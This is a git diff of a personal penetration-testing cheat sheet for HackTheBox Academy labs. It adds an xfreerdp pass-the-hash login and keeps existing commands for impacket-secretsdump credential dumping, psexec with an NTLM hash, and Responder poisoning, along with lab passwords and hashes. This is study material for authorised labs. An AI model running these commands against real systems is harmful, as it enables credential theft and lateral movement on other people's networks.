@@ -3,8 +3,11 @@ Below are just examples of how to execute each of the commands that I would norm
 ```
 xfreerdp /v:10.129.43.43 /u:htb-student /p:'HTB_@cademy_stdnt!' /drive:linux,/home/p3ta/ /dynamic-resolution
 ```
+```
+xfreerdp /v:10.129.203.122 /u:administrator /pth:'bac9dc5b7b4bec1d83e0e9c04b477f26' /drive:linux,/home/p3ta/HTB /dynamic-resolution
+```
 # Impacket
-Secretsdump
+## Secretsdump
 ```
 impacket-secretsdump server_adm@10.129.43.42 -just-dc-user administrator
 ```
@@ -17,8 +20,7 @@ impacket-secretsdump local -system registry/SYSTEM -ntds Active\ Directory/ntds.
 ```
 impacket-secretsdump local -system SYSTEM -sam SAM
 ```
-
-PSexec
+## PSexec
 ```
 impacket-psexec administrator@10.129.43.42 -hashes :7796ee39fd3a9c3a1844556115ae1a54
 ```
@@ -42,3 +44,4 @@ Location: /tools/responder
 ```
 sudo ./Responder.py -wrf -v -I tun0
 ```
+
